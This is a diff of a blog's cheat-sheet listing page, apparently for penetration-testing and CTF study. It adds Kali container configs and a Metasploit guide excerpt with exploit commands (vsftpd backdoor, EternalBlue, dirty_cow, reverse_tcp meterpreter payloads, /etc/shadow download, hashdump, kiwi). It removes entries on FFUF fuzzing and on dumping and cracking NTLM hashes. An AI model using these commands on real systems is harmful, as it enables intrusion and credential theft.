@@ -200,23 +200,6 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">FFUF - Fuzz Faster U Fool
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>1. Directory and File Brute Forcing Basic Directory Fuzzing:
-ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ/ Fuzz common directory names (e.g., /admin/, /uploads/). 2. Fuzzing Parameters Basic Parameter Fuzzing:
-ffuf -w wordlist.txt -u https://example.com/page.php?param=FUZZ Replaces FUZZ with words from the wordlist to test URL parameters. Filter by Status Code:
-ffuf -w wordlist.txt -u https://example.com/page.php?param=FUZZ -mc 200 Shows responses only for the 200 OK status code. Filter by Content Size:
-ffuf -w wordlist.txt -u https://example.com/page.php?param=FUZZ -fs 150 Filters results based on exact response size in bytes. Fuzzing with JSON Payload (for APIs):
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
-  <a class="entry-link" aria-label="post link to FFUF - Fuzz Faster U Fool" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/ffuf-fuzz-faster-u-fool/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
     <h2 class="entry-hint-parent">IDA Debugger Key Notes (Default)
     </h2>
   </header>
@@ -243,6 +226,48 @@ kali@gajendra:~$ sudo su 2. Checking Network Interface Status Check your network
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>4 min</span></footer>
   <a class="entry-link" aria-label="post link to Jamming Wi-Fi with `mdk4`" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/wifi-jam-tutorials-by-mdk3_mdk4_aireplayng/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Kali Distrobox Persistent Config
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>📂 Files Dockerfile &#43; Distrobox commands (single block)
+FROM docker.io/kalilinux/kali-rolling ENV DEBIAN_FRONTEND=noninteractive TZ=Etc/UTC # install essentials: zsh sudo tzdata chrony util-linux iproute2 RUN apt update &amp;&amp; apt install -y \ zsh sudo tzdata chrony util-linux iproute2 \ &amp;&amp; useradd -m -s /usr/bin/zsh kali \ &amp;&amp; echo &#34;kali:kali&#34; | chpasswd \ &amp;&amp; usermod -aG sudo kali \ &amp;&amp; apt clean &amp;&amp; rm -rf /var/lib/apt/lists/* USER kali WORKDIR /home/kali ENTRYPOINT [&#34;/usr/bin/zsh&#34;,&#34;-l&#34;] 🛠️ Build Image Run from the folder with the Dockerfile
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
+  <a class="entry-link" aria-label="post link to Kali Distrobox Persistent Config" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/kali-distrobox-persistent-config/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Kali Docker Persistent Container
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>📂 Files Dockerfile (placed in empty folder)
+FROM kalilinux/kali-rolling ENV DEBIAN_FRONTEND=noninteractive TZ=Etc/UTC # install essentials: zsh sudo tzdata chrony util-linux iproute2 RUN apt update &amp;&amp; apt install -y \ zsh sudo tzdata chrony util-linux iproute2 \ &amp;&amp; useradd -m -s /usr/bin/zsh kali \ &amp;&amp; echo &#34;kali:kali&#34; | chpasswd \ &amp;&amp; usermod -aG sudo kali \ &amp;&amp; apt clean &amp;&amp; rm -rf /var/lib/apt/lists/* USER kali WORKDIR /home/kali ENTRYPOINT [&#34;/usr/bin/zsh&#34;,&#34;-l&#34;] 🛠️ Build Image Run from the folder with Dockerfile
+docker build -t kali-zsh-vm:privileged . 🚀 Create and Run Persistent Privileged Container This creates kali-persistent with host timezone and /tmp/test mounted
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to Kali Docker Persistent Container" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/kali-docker-persistent-container/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Metasploit Practical Guide (for Beginners and CTF use)
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>🌐 1.Start Metasploit Console sudo systemctl start postgresql msfconsole Initialize the Metasploit Database (First Time Only) msfdb init 🔍 2. Scanning Targets Quick Target Discovery nmap -sn 10.10.10.0/24 Full Port &#43; Version Scan (Integrated with Metasploit DB) db_nmap -sC -sV -O -Pn 10.10.10.129 View Discovered Hosts &amp; Services hosts services 🪡 3. Exploit Search and Module Use Search by service name or CVE search vsftpd search type:exploit name:smb Load a Module use exploit/unix/ftp/vsftpd_234_backdoor Explore Module Info info # Shows full module details (author, platform, options, etc) show options # Required &#43; optional settings (RHOSTS, LHOST, etc) show advanced # Advanced options like threads, timeouts, proxies show payloads # Compatible payloads for this exploit 💡 4. Linux Exploitation Workflow Example: FTP Backdoor use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.10.10.129 set payload cmd/unix/interact run If Shell is Basic: Upgrade python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Or Use Web Delivery use exploit/multi/script/web_delivery set payload linux/x86/meterpreter/reverse_tcp set LHOST &lt;your_ip&gt; set LPORT 4444 run Post-Exploitation (Linux) sessions -i 1 getuid sysinfo Enumerate OS and Configs run post/linux/gather/enum_os run post/linux/gather/enum_configs Dump Password Hashes download /etc/passwd download /etc/shadow john shadow --wordlist=/usr/share/wordlists/rockyou.txt Local Exploit Suggestion run post/multi/recon/local_exploit_suggester Example Local Root Exploit use exploit/linux/local/dirty_cow set SESSION 1 run Confirm Root id whoami 💻 5. Windows Exploitation Workflow Example: EternalBlue use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.130 set LHOST &lt;your_ip&gt; set payload windows/x64/meterpreter/reverse_tcp run Session Handling sessions sessions -i 1 sysinfo getuid Post-Exploitation (Windows) Dump Hashes hashdump load kiwi kiwi_cmd &#34;lsadump::sam&#34; Process Migration ps migrate &lt;pid&gt; getpid Privilege Escalation getsystem Or use:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to Metasploit Practical Guide (for Beginners and CTF use)" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/"></a>
 </article>
 
 <article class="post-entry"> 
@@ -322,39 +347,6 @@ Step 2: Download the file using Invoke-WebRequest on Windows Open PowerShell on 
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
   <a class="entry-link" aria-label="post link to Tutorial: Downloading Files from Linux to Windows Using Windows CLI" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/windows-native-shell/"></a>
 </article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">Tutorial: String Manipulation in Perl with s///, y///, and s///g
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Perl provides powerful operators for manipulating strings using regular expressions. Here’s a breakdown of each operator with examples:
-s/// (Substitution Operator) Syntax: s/old-pattern/new-pattern/
-Purpose: Replaces occurrences of old-pattern with new-pattern in a string.
-Example: s/John/Doe/ replaces the first instance of “John” with “Doe”.
-Example 1: Replace “John” with “Doe”
-text = &#34;Hello John. John is a friend.&#34;; regex = s/John/Doe/; # Result: &#34;Hello Doe. John is a friend.&#34; Example 2: Replace “white” with “black”
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>3 min</span></footer>
-  <a class="entry-link" aria-label="post link to Tutorial: String Manipulation in Perl with s///, y///, and s///g" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/perl-rename-tutorial/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM) Run these commands on the target Windows machine:
-reg.exe save hklm\sam sam reg.exe save hklm\security security reg.exe save hklm\system system These commands save the SAM, SECURITY, and SYSTEM hives as files in the current directory. 📂 Copy these files to your attacker machine for offline cracking. 🔍 Step 2: Extract Hashes from Saved Files Two popular tools to extract NTLM hashes:
-Using samdump2: samdump2 ./system ./sam Using Impacket’s secretsdump.py: secretsdump.py -sam sam -system system LOCAL 📄 Sample Output Explained Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450::: 👤 Username (e.g., Administrator) 🆔 User RID/Group (e.g., 500) 🔐 LM hash (usually empty/disabled) 🗝️ NT hash (this is what you crack) 🛠️ Step 3: Crack NTLM Hashes Extract NT hashes (4th field) and save in hashes.txt:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/dumping_ntlm_hashes_via_non_interactive_shell_and__cracking_it_using_various_tools/"></a>
-</article>
 <footer class="page-footer">
   <nav class="pagination">
     <a class="prev" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/">
@@ -392,7 +384,9 @@ Using samdump2: samdump2 ./system ./sam Using Impacket’s secretsdump.py: secre
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
